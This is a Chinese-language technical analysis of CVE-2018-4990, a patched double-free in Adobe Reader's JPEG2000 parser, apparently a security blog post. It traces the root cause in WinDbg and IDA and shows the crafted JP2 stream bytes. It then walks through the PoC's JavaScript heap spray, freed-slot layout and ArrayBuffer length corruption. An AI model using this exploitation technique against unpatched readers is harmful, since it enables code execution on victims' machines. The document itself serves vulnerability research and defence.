***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 测试环境

> Windows 7 SP1 x86
>
> Adobe Reader 2017.009.20044

## 漏洞成因

 **Adobe 官方安全公告说这是一个 Double Free 漏洞, 内存相关的问题, 我们打开页堆后运行 Reader, 用 Windbg 附加,
打开 POC 后崩溃, 崩溃位置以及栈回溯:**

    
    
    0:000> r
    eax=d0d0d0b0 ebx=00000000 ecx=d0d0d000 edx=d0d0d0b0 esi=022e0000 edi=022e0000
    eip=6f096e88 esp=0019a478 ebp=0019a4c4 iopl=0         nv up ei ng nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
    verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8:
    6f096e88 813abbbbcdab    cmp     dword ptr [edx],0ABCDBBBBh ds:0023:d0d0d0b0=????????
    0:000> kv L0c
     # ChildEBP RetAddr  Args to Child
    00 0019a4c4 6f096f95 022e1000 d0d0d0d0 022e0000 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8 (FPO: [Non-Fpo])
    01 0019a4e8 6f097240 022e1000 d0d0d0d0 0019a558 verifier!AVrfpDphFindBusyMemory+0x15 (FPO: [Non-Fpo])
    02 0019a504 6f099080 022e1000 d0d0d0d0 008fd21e verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x20 (FPO: [Non-Fpo])
    03 0019a520 779065f4 022e0000 01000002 d0d0d0d0 verifier!AVrfDebugPageHeapFree+0x90 (FPO: [Non-Fpo])
    04 0019a568 778ca0aa 022e0000 01000002 d0d0d0d0 ntdll!RtlDebugFreeHeap+0x2f (FPO: [Non-Fpo])
    05 0019a65c 778965a6 00000000 d0d0d0d0 3f304f98 ntdll!RtlpFreeHeap+0x5d (FPO: [Non-Fpo])
    06 0019a67c 771bbbe4 022e0000 00000000 d0d0d0d0 ntdll!RtlFreeHeap+0x142 (FPO: [Non-Fpo])
    07 0019a690 6d30ecfa 022e0000 00000000 d0d0d0d0 kernel32!HeapFree+0x14 (FPO: [Non-Fpo])
    08 0019a6a4 68c40622 d0d0d0d0 8348117b 433f2fac MSVCR120!free+0x1a (FPO: [Non-Fpo]) (CONV: cdecl)
    WARNING: Stack unwind information not available. Following frames may be wrong.
    09 0019a7c4 68c56444 4cf46fb8 3c5f8fd8 000000fd JP2KLib!JP2KCopyRect+0xbad6
    0a 0019a81c 6dfa5f50 48412e88 6829efd0 3c5f8fd8 JP2KLib!JP2KImageInitDecoderEx+0x24
    0b 0019a8a4 6dfa78ed 3d074fa8 433f2fac 3d074fa8 AcroRd32!AX_PDXlateToHostEx+0x25e41d
    

可以看到, jp2klib 在调用 free 释放时奔溃了, 这里释放的地址是 0xd0d0d0b0, 这是页堆的后置填充数据, 这里似乎是访问越界了,
我们 ub 看下调用 free 处的代码:

    
    
    68c40605 8bcb            mov     ecx,ebx
    68c40607 894d10          mov     dword ptr [ebp+10h],ecx
    68c4060a 395804          cmp     dword ptr [eax+4],ebx
    68c4060d 7e2c            jle     JP2KLib!JP2KCopyRect+0xbaef (68c4063b)
    68c4060f 8b4648          mov     eax,dword ptr [esi+48h]
    68c40612 8b400c          mov     eax,dword ptr [eax+0Ch]
    68c40615 8b0488          mov     eax,dword ptr [eax+ecx*4]
    68c40618 85c0            test    eax,eax
    68c4061a 7413            je      JP2KLib!JP2KCopyRect+0xbae3 (68c4062f)
    68c4061c 50              push    eax
    68c4061d e88a690100      call    JP2KLib!JP2KTileGeometryRegionIsTile+0x1b8 (68c56fac) ; free
    68c40622 8b4648          mov     eax,dword ptr [esi+48h]
    68c40625 59              pop     ecx
    68c40626 8b4d10          mov     ecx,dword ptr [ebp+10h]
    68c40629 8b400c          mov     eax,dword ptr [eax+0Ch]
    68c4062c 891c88          mov     dword ptr [eax+ecx*4],ebx
    68c4062f 8b4648          mov     eax,dword ptr [esi+48h]
    68c40632 41              inc     ecx
    68c40633 894d10          mov     dword ptr [ebp+10h],ecx
    68c40636 3b4804          cmp     ecx,dword ptr [eax+4]
    68c40639 7cd4            jl      JP2KLib!JP2KCopyRect+0xbac3 (68c4060f)
    

可以看到, 这里在循环调用 free 函数, 我们重新调试, 在取出被释放的值之前下断, 这里在 jp2klib + 0x50605 的位置下断.

刚附加时, jp2klib 是没有加载的, 这里可以使用命令 sxe ld jp2klib 等加载了这个模块以后再下断. 断下后调试我们可以发现, 这里在和
0xff 进行比较, 也就是循环要执行 0xff 次:

    
    
    6cd30605 8bcb            mov     ecx,ebx
    6cd30607 894d10          mov     dword ptr [ebp+10h],ecx
    6cd3060a 395804          cmp     dword ptr [eax+4],ebx ds:0023:7051ffe4=000000ff
    6cd3060d 7e2c            jle     JP2KLib!JP2KCopyRect+0xbaef (6cd3063b)
    

继续跟踪, 跟到要从 eax 指向的内存中取出要释放的地址时, 我们看下 eax 所指内存块:

    
    
    0:000> !heap -p -a eax
        address 07d1e180 found in
        _HEAP @ d50000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            07d1e178 0081 0000  [00]   07d1e180    003f4 - (busy)
    

可以看到, 这个 eax 所指内存只有 0x3f4 大小, 而 0x3f4 / 4 = 0xfd, 也就是说这里循环 0xff 次比正常的多了两次,
也就是越界访问了 8 个字节, 这也就是为什么前面会释放页堆后置填充数据的原因.

我们关掉页堆重新调试, 继续在之前的地方下断, 断下后查看越界访问的 8 字节:

    
    
    0:000> dc eax + 0x3f4
    07d1e574  0d0e0048 0d0f0048 00000000 0e17e719  H...H...........
    07d1e584  88000000 00000000 000003f0 08231608  ..............#.
    07d1e594  00000000 00000000 00000000 00000000  ................
    

可以看到, 这里被填充了两个值, 通过查看 POC 也可以看到, 这两个值是在 POC 中指定的, 也就是说, 此处的问题可以造成任意两个地址被释放.
接着的问题就是为何会造成这里的越界访问, eax 所指内存从哪里分配? 大小又是怎么计算的? 循环的次数又从何而来?

我们看上面的代码, eax 所指内存在 poi(poi(esi + 0x48) + 0x0c), 而比较的次数在 +0x04 的位置, 这里我们可以通过在
IDA 追溯到 esi 的分配位置, 找到后下断重新调试, 然后在分配后的偏移 0x48 的位置下内存写入断点, 找到给 0x48 偏移赋值的位置,
然后再对这里的内存地址偏移 0x0c 的位置下内存写入断点, 这样依次跟踪. 也可以使用 !address 首先看下 esi 所指内存的类型,
发现是堆内存, 直接开启 UST, !heap -p -a 一下就可以看到 esi 的分配地址了. 这里因为用内存写入断点的方法跟踪过, 知道了偏移
0x48 和偏移 0x0c 处的内存也是堆内存, 所以这里可以直接用 UST 找到分配 0x0c 处内存的位置.

找到 0x0c 偏移处内存的分配位置后, 重新调试并下断 jp2klib + 0x41391:

    
    
    5edb1380 8b5df0          mov     ebx,dword ptr [ebp-10h]
    5edb1383 3bc3            cmp     eax,ebx
    5edb1385 0f821a090000    jb      JP2KLib!JP2KCodeStm::write+0x187c5 (5edb1ca5)
    5edb138b c1eb02          shr     ebx,2
    5edb138e 6a04            push    4
    5edb1390 53              push    ebx
    5edb1391 e8295b0200      call    JP2KLib!JP2KTileGeometryRegionIsTile+0xcb (5edd6ebf)
    5edb1396 837f4800        cmp     dword ptr [edi+48h],0 ds:0023:05022a50=00000000
    5edb139a 59              pop     ecx
    5edb139b 59              pop     ecx
    5edb139c 8945f8          mov     dword ptr [ebp-8],eax
    5edb139f 7516            jne     JP2KLib!JP2KCodeStm::write+0x17ed7 (5edb13b7)
    5edb13a1 6a01            push    1
    5edb13a3 6a20            push    20h
    5edb13a5 e8155b0200      call    JP2KLib!JP2KTileGeometryRegionIsTile+0xcb (5edd6ebf)
    5edb13aa 894748          mov     dword ptr [edi+48h],eax
    

断下后可以看到, 在 5edb1391 分配时 ebx 等于 0xfd, 通过分析可以知道, 这里的分配函数有两个参数, 第一个参数是元素个数,
第二个参数是元素类型, 这里分配了 0x3f4 字节, ebx 的原始值在 ebp-10 中, 我们可以看下:

    
    
    0:000> dd ebp-10 L1
    0024a3e0  000003f4
    

下面 5edb13a5 分配的 20 字节其实就是偏移 0x48 处的内存, 也就是前面的 poi(esi + 0x48), 这可以通过之前在找到分配
esi 的位置后, 下内存写入断点确认, 也可以在循环释放时直接利用 UST 找到这个位置. 当这 20 字节内存分配后, 直接在偏移 0x0c
的位置下内存写入断点, 就可以发现最后把上面分配的大小为 0x3f4 的内存地址赋值到此处.

接着看看这块内存的大小是怎么计算的, 我们在 IDA 追溯 ebp-10, 看看里面的值是在哪里赋值的:

    
    
    .text:00041333 mov     eax, ebx
    .text:00041335 mov     ecx, esi
    .text:00041337 sub     eax, [ebp+var_4]
    .text:0004133A push    eax
    .text:0004133B mov     [ebp+var_10], eax
    

跟到这里可以看到, ebp-10h 的值来自 ebx 减 ebp-4 的值, 继续跟踪发现 ebx 的值来自 ebp-14h, 继续跟踪, 发现如下代码:

    
    
    .text:00040FEE push    esi
    .text:00040FEF lea     eax, [ebp+var_4]
    .text:00040FF2 push    eax
    .text:00040FF3 lea     eax, [ebp+var_18]
    .text:00040FF6 push    eax
    .text:00040FF7 lea     eax, [ebp+var_14]
    .text:00040FFA push    eax
    .text:00040FFB call    sub_3FD43
    

这里将 ebp-4 和 ebp-14h 的地址都当作参数传进去了, 我们可以在该函数下断跟进(也可以对两个地址下内存写入断点,
可以确认就是该函数填充的值):

    
    
    5ee1fd43 55              push    ebp
    5ee1fd44 8bec            mov     ebp,esp
    5ee1fd46 56              push    esi
    5ee1fd47 8b7514          mov     esi,dword ptr [ebp+14h]
    5ee1fd4a 8bce            mov     ecx,esi
    ...
    5ee1fd5c 53              push    ebx
    5ee1fd5d 57              push    edi
    5ee1fd5e 6a04            push    4
    5ee1fd60 8bce            mov     ecx,esi
    5ee1fd62 e8b4b5fcff      call    JP2KLib!JP2KUserActions::operator=+0xa07b (5edeb31b)
    5ee1fd67 8b7d08          mov     edi,dword ptr [ebp+8]
    5ee1fd6a 8bce            mov     ecx,esi
    5ee1fd6c 6a04            push    4
    5ee1fd6e 8907            mov     dword ptr [edi],eax ; 赋值给 ebp-14h 
    5ee1fd70 e8a6b5fcff      call    JP2KLib!JP2KUserActions::operator=+0xa07b (5edeb31b)
    5ee1fd75 8b4d0c          mov     ecx,dword ptr [ebp+0Ch]
    5ee1fd78 8b5d10          mov     ebx,dword ptr [ebp+10h]
    5ee1fd7b 6a08            push    8
    5ee1fd7d 8901            mov     dword ptr [ecx],eax
    5ee1fd7f 58              pop     eax
    5ee1fd80 8903            mov     dword ptr [ebx],eax ; 赋值给 ebp-4
    

当执行完 5ee1fd62 处的函数 5edeb31b 后, 发现 eax 等于 0x3fc, 在这个函数的下方也可以发现给 epb-4 和
ebp-14h赋值的地方. 我们跟进 5edeb31b 函数:

    
    
    if ( a1 && a1 <= 4 ) {
      v4 = (unsigned __int8)sub_B21A((int)this, (_BYTE *)&a1 + 3);
      if ( v2 > 1 ) {
        v5 = v2 - 1;
        do {
          v4 = (unsigned __int8)sub_B21A((int)v3, (_BYTE *)&a1 + 3) + (v4 << 8);
          --v5;
        } while ( v5 );
      }
      result = v4;
    }
    

可以看到, 这个函数调用 sub_B21A 每次读取一个字节, 然后通过左移位合在一起. 我们进入 sub_B21A 函数查看:

    
    
    v2 = this;
    if ( *(_BYTE *)(this + 8) || *(_DWORD *)(this + 0x10) >= *(_DWORD *)(this + 0x14) )
      ...
    if ( *(_BYTE *)(v2 + 9) && *(_DWORD *)(v2 + 0x10) >= *(_DWORD *)(v2 + 0x14) ) {
      ...
    } else {
      v1 = *(char **)(v2 + 0x10);
      v5 = *v1;
      ++*(_DWORD *)(v2 + 0x1C);
      *(_BYTE *)(v2 + 0x18) = v5;
      *(_DWORD *)(v2 + 0x10) = v1 + 1;
      result = *(_BYTE *)(v2 + 0x18);
    }
    return result;
    

可以看到该函数从 ecx 指向的内存中取一个指针并取值, 查看 poi(ecx + 0x10) 指向的数据:

    
    
    0:000> db poi(ecx + 0x10)
    17d3be80  00 00 00 0c 6a 50 20 20-0d 0a 87 0a 00 00 04 1d  ....jP  ........
    17d3be90  6a 70 32 68 00 00 00 16-69 68 64 72 00 00 00 20  jp2h....ihdr... 
    17d3bea0  00 00 00 20 00 01 ff 07-00 00 00 00 03 fc 63 6d  ... ..........cm
    17d3beb0  61 70 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ap..............
    17d3bec0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    17d3bed0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    17d3bee0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    17d3bef0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    

可以看到一些关键字 jp2h, ihdr 等. 通过搜索可以知道这是一个 jpg2000 文件. 通过多次调试可以知道, ecx 偏移 0x0c
处的指针一直指向该文件数据的起始位置, 偏移 0x10 处的指针指向当前取值位置, 偏移 0x14 处指向数据结尾, 偏移 0x04 处存放数据的大小.

由于 5edeb31b 函数会被调用多次, 我们可以下条件断点, 看看第几次调用时返回的 eax 等于 0x3fc:

    
    
    r $t0 = 0
    bp jp2klib + 0x3fd67 "r $t0 = $t0 + 1; .if eax != 0x3fc {g;} .else {.printf \"count: %d\", $t0;}"
    

通过上述断点我们可以知道在第四次时该函数返回 0x3fc, 我们重新调试下断, 第四次中断时跟进. 通过跟踪可以发现, 0x3fc 是从 jpg2000
文件的如下位置读取的:

    
    
    17d3bea0  00 00 00 20 00 01 ff 07-00 00 [00 00 03 fc] 63 6d  ... ..........cm
    17d3beb0  61 70 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ap..............
    

接着再继续寻找前面的循环次数 0xff 是从哪儿获取的, 我们可以对存放该值的位置下内存写入断点, 也就是前面分配的 20 字节大小内存的偏移 0x04
的位置. 下断运行后断在如下位置:

    
    
    .text:00041125                 mov     ecx, [edi+48h]
    .text:00041128                 mov     [ecx], eax
    .text:0004112A                 mov     ecx, [esi+10h]
    .text:0004112D                 inc     dword ptr [esi+1Ch]
    .text:00041130                 mov     al, [ecx]
    .text:00041132                 mov     [esi+18h], al
    .text:00041135                 lea     eax, [ecx+1]
    .text:00041138                 movzx   ecx, byte ptr [esi+18h]
    .text:0004113C                 mov     [esi+10h], eax
    .text:0004113F                 mov     eax, [edi+48h]
    .text:00041142                 mov     [eax+4], ecx
    .text:00041145                 mov     ecx, [edi+48h] ; 断在此处
    

可以看到将 ecx 的值赋值给偏移 0x04 处, 我们可以重新调试并在 0x41125 处下断调试. 通过调试可以发现 ecx 的值来自 esi+10h
处的指针, 而这里的 esi 就是上面的 this 指针 ecx, 其偏移 0x10 处存放的是指向当前取值位置的指针, 我们看下当前指向的数据:

    
    
    0:000> dc ecx - 20
    4e6f9bc0  00000000 00000000 00000000 00000000  ................
    4e6f9bd0  00000000 00000000 63700b00 ffff726c  ..........pclr..
    4e6f9be0  ffffffff ffffffff ffffffff ffffffff  ................
    4e6f9bf0  ffffffff ffffffff ffffffff ffffffff  ................
    4e6f9c00  ffffffff ffffffff ffffffff ffffffff  ................
    

可以看到, 同样是 jpg2000 文件的数据. jpg2000 文件包含在 PDF 中, 我们可以通过在 PDF 中搜索关键字 image
找到存放该文件的流对象, 在 POC 中该流是没有编码的, 但是真实样本中流是可能编码的, 需要解码后才能看到原始数据, 找到的流数据如下:

    
    
    2600h: 0D 0A 0D 0A 32 33 20 30 20 6F 62 6A 0D 0A 3C 3C  ....23 0 obj..<< 
    2610h: 0D 0A 2F 53 75 62 74 79 70 65 20 2F 49 6D 61 67  ../Subtype /Imag 
    2620h: 65 0D 0A 2F 46 69 6C 74 65 72 20 2F 4A 50 58 44  e../Filter /JPXD 
    2630h: 65 63 6F 64 65 0D 0A 2F 4C 65 6E 67 74 68 20 32  ecode../Length 2 
    2640h: 31 32 33 0D 0A 2F 4E 61 6D 65 20 2F 58 0D 0A 2F  123../Name /X../ 
    2650h: 57 69 64 74 68 20 33 32 0D 0A 2F 54 79 70 65 20  Width 32../Type  
    2660h: 2F 58 4F 62 6A 65 63 74 0D 0A 2F 48 65 69 67 68  /XObject../Heigh 
    2670h: 74 20 33 32 0D 0A 3E 3E 0D 0A 73 74 72 65 61 6D  t 32..>>..stream 
    2680h: 0D 0A 00 00 00 0C 6A 50 20 20 0D 0A 87 0A 00 00  ......jP  ..‡... 
    2690h: 04 1D 6A 70 32 68 00 00 00 16 69 68 64 72 00 00  ..jp2h....ihdr.. 
    26A0h: 00 20 00 00 00 20 00 01 FF 07 00 00 00 00 03 FC  . ... ..ÿ......ü 
    26B0h: 63 6D 61 70 00 00 00 00 00 00 00 00 00 00 00 00  cmap............ 
    ... 
    2A90h: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ 
    2AA0h: 00 00 00 00 00 00 00 00 00 00 00 0B 70 63 6C 72  ............pclr 
    2AB0h: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ 
    2AC0h: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ 
    2AD0h: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ 
    2AE0h: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ 
    2AF0h: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ 
    2B00h: FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
    

至此, 我们知道了内存块的大小和循环次数均是来自恶意的 jpg2000 文件, 因此导致了越界访问, 可以释放任意两个地址. 这里我们在看下 POC,
看看是哪里触发了这个问题, 我们在 POC 中看到如下代码:

    
    
    function myfun1()
    {
        ....
        var f1 = this.getField("Button1");
        if(f1)
        {
            f1.display = display.visible;
        }
        var sto2 = app.setTimeOut("myfun2()",250);
    }
    function myfun2()
    {
        var f1 = this.getField("Button1");
        if(f1)
        {
            f1.display = display.hidden;
        }
        ...
    }
    

这里推测就是这段代码触发了越界访问, 因为纵观整个 POC, 这段代码前后基本就是内存分配布局操作了, 这里我们可以在 myfun1 中的代码段前后插入
alert 弹窗, 并配合调试器在越界访问的循环处下断点, 测试后发现, 正是执行了这段代码以后就断在了越界访问循环处. 通过测试发现删掉 myfun2
中的代码段并不影响, 但是删掉 myfun1 中的只保留 myfun2 中的或者删掉 myfun1 中的把 myfun1 中的代码段复制到 myfun2
也是不行的.

最后, 再来看一下修复过的文件在流程上有什么不同, 使用的修复版本为 Adobe Reader 2018.011.20040. 通过调试比较可以发现,
在分配了 20 字节大小的内存后给偏移 0x0c 处赋值时有如下区别:

    
    
    if ( *(_DWORD *)(*(_DWORD *)(a2 + 0x48) + 4) ) {
        ...
    }
    sub_66FAC(*(void **)(*(_DWORD *)(a2 + 0x48) + 0xC));
    v78 = v140;
    *(_DWORD *)(*(_DWORD *)(a2 + 0x48) + 0xC) = 0;
    *(_DWORD *)(*(_DWORD *)(a2 + 0x48) + 0xC) = v78;
    -----------------------------------------------------    if ( *(_DWORD *)(*(_DWORD *)(a2 + 0x48) + 4) ) {
        ...
    }
    v80 = *(_DWORD *)(a2 + 0x48);
    if ( *(_DWORD *)(v80 + 0xC) ) {
      sub_6706A(*(void **)(v80 + 0xC));
      v81 = v143;
      *(_DWORD *)(*(_DWORD *)(a2 + 0x48) + 0xC) = 0;
      *(_DWORD *)(*(_DWORD *)(a2 + 0x48) + 0xC) = v81;
    }
    

可以看到, 修复前(分隔符上面的代码)在给偏移 0x0c 处赋值时没有做任何判断, 直接赋值, 而修复后的代码在赋值之前比较了是否为 0 , 如果为 0
则不进行赋值. 这里没有赋值到了后面进入循环之前自然就过不了是否为空的判断.

## 漏洞利用

我们用编辑器打开 POC, 查看其中的 JS 代码, 看看是如何利用该漏洞的. 打开后可以看到, 首先分配了一些内存, 这里我们可以用文章:
[CVE-2018-4990 Adobe Reader
代码执行漏洞利用分析](https://ti.360.net/blog/articles/analysis-of-cve-2018-4990/) 中的方法,
在 JS 代码添加一些我们自己的代码来辅助我们分析对象在内存中的结构, 这里我们先在 a1 的分配循环后面插入如下代码查看 a1 分配后的情况:

    
    
    var my_array = new Array(0x10);    
    my_array[0] = 0x23badbad;
    my_array[1] = a1[1];
    my_array[2] = a1[2];
    my_array[3] = 0;
    a1[1][0] = 0xbadbad22;
    a1[1][1] = 0xbadbad33;
    app.alert("pause");
    

然后打开 POC, 在弹框后用 Windbg 附加, 使用命令

    
    
    s -d 0x10000 L?7fffffff 0x23badbad
    

搜索. 这里注意, 经过测试, Tag 的设置不能大于 0x80000000, 不然搜索时会搜不到. 搜索到以后, 查看内存:

    
    
    0:009> s -d 0x10000 L?7fffffff 0x23badbad
    05d15b70  23badbad ffffff81 05492660 ffffff87  ...#....`&I.....
    0:009> dc 05d15b70  
    05d15b70  23badbad ffffff81 05492660 ffffff87  ...#....`&I.....
    05d15b80  054926b8 ffffff87 00000000 ffffff81  .&I.............
    05d15b90  05492768 ffffff87 054927c0 ffffff87  h'I......'I.....
    05d15ba0  05492818 ffffff87 05492870 ffffff87  .(I.....p(I.....
    05d15bb0  7247e12b 8c000000 69375cd4 05d14da8  +.Gr.....\7i.M..
    05d15bc0  69375d20 69375d34 05d64838 00000000   ]7i4]7i8H......
    

这里可以看到我们设置的 Tag 以及我们放入的两个对象的地址. 每个地址后面跟的应该是该对象的类型, 这里我们放入的两个对象全是数组类型的,
所以都是相同的值. 这里注意到, 我们放入的那两个对象的地址几乎是挨着的, 我们查看一下:

![image.png](https://image.3001.net/images/20190512/1557670933_5cd82c15cc9f8.png!small)

![](_v_images/1537702689_32171.png)

因为 a1 的每个元素都是一个有 252(0xfd) 元素 Uint32Array, 总共有 0x3f0 字节, 我们可以在上面看到这两个值. 通过尝试,
我们可以知道, 上图中的 0x3f0 后面的 0x54372f0 偏移 0x0c 处的指针就是指向实际存储数据的指针(可以看到, 对象地址偏移 0x50
处也是该指针值: 0x05b601b0):

    
    
    0:009> dd 054372f0 Lc
    054372f0  054b2b38 05425be0 00000000 05b601b0
    05437300  00000000 00000000 00000000 00000000
    05437310  00000000 00000000 00000000 00000000
    0:009> dd 05b601b0 Lc
    05b601b0  badbad22 badbad33 00000000 00000000
    05b601c0  00000000 00000000 00000000 00000000
    05b601d0  00000000 00000000 00000000 00000000
    0:009> dd 05b601b0 + 0n249 * 4 Lc
    05b60594  0d0e0048 0d0f0048 00000000 736339a9
    05b605a4  88000066 ffffff00 ffffff00 ffffff00
    05b605b4  00000000 0000005f 000000a1 000000a1
    

这里可以看到我们设置的值以及 POC 代码设置的两个值. 通过 !heap 命令我们可以知道这块内存在堆中的大小, 这里我们也查看一下 POC
设置的两个值:

    
    
    0:009> !heap -p -a 05b601b0 
        address 05b601b0 found in
        _HEAP @ 890000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            05b60198 0081 0000  [00]   05b601a0    00400 - (busy)
    0:009> !heap -p -a 0d0e0048
    0:009> !heap -p -a 0d0f0048
    0:009> !address 0d0e0048
    Usage:                  Free
    Base Address:           08890000
    End Address:            65b60000
    Region Size:            5d2d0000 (   1.456 GB)
    State:                  00010000          MEM_FREE
    Protect:                00000001          PAGE_NOACCESS
    Type:                   <info not present at the target>
    

可以看到此时 POC 设置的两个地址都还没有被分配. 继续查看 POC 可以发现接下来分配了 0x1000 个大小为0x10000 - 24 的
ArrayBuffer, 我们用上面获取对象地址的方法, 看下 ArrayBuffer:

    
    
    for(var i1=1;i1<spraynum;i1++) {    
        sprayarr[i1] = new ArrayBuffer(spraylen);                         
    }
    var my_array = new Array(0x10);
    my_array[0] = 0x23badbad;
    my_array[1] = sprayarr[1];
    my_array[2] = sprayarr[2];
    my_array[3] = 0;
    app.alert("233");
    

这里注意, 因为 ArrayBuffer 没法像数组一样直接使用, 所以不能像前面一样往这个数组中赋值了. 改好后打开搜索我们的 Tag, 找到我们的数组,
可以看到, 这里 sprayarr[1] 和 sprayarr[2] 同样的挨着的:

    
    
    0:012> dc 05291f00 Lc
    05291f00  23badbad ffffff81 0819e420 ffffff87  ...#.... .......
    05291f10  0819e4b8 ffffff87 00000000 ffffff81  ................
    05291f20  0056004e 00540049 005f0045 00540053  N.V.I.T.E._.S.T.
    0:012> dc 0819e420 Lc
    0819e420  05eb2b38 05e25be0 00000000 06cf0058  8+...[......X...
    0819e430  00000000 00000000 00000000 00000000  ................
    0819e440  00000000 00000000 00000000 00000000  ................
    0:012> !heap -p -a 06cf0058  
        address 06cf0058 found in
        _HEAP @ 9d0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            06cf0040 2000 0000  [00]   06cf0048    0fff8 - (busy)
    0:012> dc 06cf0048 Lc  
    06cf0048  00000000 0000ffe8 00000000 00000000  ................
    06cf0058  00000000 00000000 00000000 00000000  ................
    06cf0068  00000000 00000000 00000000 00000000  ................
    

这里分析尝试可以知道, sprayarr[1] 这个对象的地址偏移 0xc 处的指针 0x06cf0058 就是指向实际存储数据的缓冲区, 我们查看它发现
UserPtr 是从 06cf0048 开始的, 我们查看这里可以看到, 偏移 4 处是它的长度 0xffe8(0x10000 - 24). 此时我们再查看
POC 设置的那两个值:

    
    
    0:012> !heap -p -a 0d0e0048
        address 0d0e0048 found in
        _HEAP @ 9d0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0d0e0040 2000 0000  [00]   0d0e0048    0fff8 - (busy) 
    0:012> !heap -p -a 0d0f0048
        address 0d0f0048 found in
        _HEAP @ 9d0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0d0f0040 2000 0000  [00]   0d0f0048    0fff8 - (busy)
    

可以看到, 这两个地址已经被分配了. 接着查看 POC, 可以看到如下代码:

    
    
    for(var i1=1;i1<(l1);i1=i1+2) {    
         delete a1[i1];
         a1[i1] = null;
    }
    

这里将上面 a1 中分配的数组隔一个释放一个, 我们前面知道了 a1 中一个数组元素的大小是 0x400, 执行完这段代码后, 就在内存中布局了一些大小为
0x400 的空洞:

    
    
    0:012> !heap -flt s 0x400
        _HEAP @ 520000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0052e360 0081 0000  [00]   0052e368    00400 - (busy)
            048537c8 0081 0081  [00]   048537d0    00400 - (busy)
            ......
            05dc8d68 0081 0081  [00]   05dc8d70    00400 - (busy)
            05dc9170 0081 0081  [00]   05dc9178    00400 - (busy)
            05dc9578 0081 0081  [00]   05dc9580    00400 - (free)
            05dc9980 0081 0081  [00]   05dc9988    00400 - (busy)
            ......
            05fb2500 0081 0081  [00]   05fb2508    00400 - (free)
            05fb2908 0081 0081  [00]   05fb2910    00400 - (busy)
            05fb2d10 0081 0081  [00]   05fb2d18    00400 - (free)
            05fb3118 0081 0081  [00]   05fb3120    00400 - (busy)
            05fb3520 0081 0081  [00]   05fb3528    00400 - (free)
            05fb3928 0081 0081  [00]   05fb3930    00400 - (busy)
            05fb3d30 0081 0081  [00]   05fb3d38    00400 - (free)
            05fb4138 0081 0081  [00]   05fb4140    00400 - (busy)
            05fb4540 0081 0081  [00]   05fb4548    00400 - (free)
            05fb4948 0081 0081  [00]   05fb4950    00400 - (busy)
            ......
            05fbd158 0081 0081  [00]   05fbd160    00400 - (free)
            05fbd560 0081 0081  [00]   05fbd568    00400 - (busy)
            05fbd968 0081 0081  [00]   05fbd970    00400 - (free)
            05fbdd70 0081 0081  [00]   05fbdd78    00400 - (busy)
            ......
    

回忆前面分析漏洞的时候我们知道, 越界访问的那个数组分配的大小是 0x3f4, 有了上面的空洞, 这样在分配这个数组时就会落在空洞里, 由于 POC
已经在内存中布局好了越界访问时要释放的值, 这样分配时落在空洞, 越界访问释放时就会释放掉提前设置的那两个值了.

继续查看 POC, 接下来就是触发越界访问的代码了, 这里我们下断, 看看越界访问释放了那两个指定地址后后会发生什么:

    
    
    ; free 0d0e0048
    0:000> !heap -p -a 0d0e0048 
        address 0d0e0048 found in
        _HEAP @ f90000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0d0e0040 2000 0000  [00]   0d0e0048    0fff8 - (free)
    ; free 0d0f0048
    0:000> !heap -p -a 0d0f0048 
        address 0d0f0048 found in
        _HEAP @ f90000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0d0e0040 4000 0000  [00]   0d0e0048    1fff8 - (free)
    

可以看到, 在释放了 0x0d0f0048 后, 它和前面的 0xd0e0048 合并成了一个大小为 0x1fff8 的空闲块. 接着 POC 分配了
0x40 个大小为 0x20000 - 24 的 ArrayBffer, 这里会导致这个空闲块被分配, 并且大小为 0x1fff8:

    
    
    0:012> !heap -p -a 0d0e0048
        address 0d0e0048 found in
        _HEAP @ 420000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0d0e0040 4000 0000  [00]   0d0e0048    1fff8 - (busy)
    0:012> dd 0d0e0048 lc
    0d0e0048  00000000 0001ffe8 00000000 00000000
    0d0e0058  00000000 00000000 00000000 00000000
    0d0e0068  00000000 00000000 00000000 00000000
    

然后 POC 遍历之前分配的那 0x1000 个大小为 0x10000 - 24 的对象数据, 找到这个大小为 0x1fff8 的块, 然后使用
setUint32 将偏移为 0x10000 - 24 的位置设置为 0x66666666, 这个位置也就是之前 0x0d0f0048 这个块的大小位置:

    
    
    0:012> dd 0d0f0048 Lc
    0d0f0048  00000000 66666666 00000000 00000000
    0d0f0058  00000000 00000000 00000000 00000000
    0d0f0068  00000000 00000000 00000000 00000000
    

